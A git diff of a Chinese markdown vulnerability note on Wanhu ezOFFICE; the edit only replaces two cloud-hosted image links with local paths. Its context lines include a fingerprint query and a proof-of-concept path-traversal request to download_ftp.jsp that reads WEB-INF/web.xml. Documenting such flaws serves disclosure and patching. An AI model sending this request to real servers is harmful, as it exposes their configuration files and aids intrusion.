@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![image-20220520132512473](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201325574.png)
+![image-20220520132512473](./images/202205201325574.png)
 
 验证POC
 
@@ -28,5 +28,5 @@ app="万户网络-ezOFFICE"
 /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
 ```
 
-![image-20220520132537562](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201325636.png)
+![image-20220520132537562](./images/202205201325636.png)
 
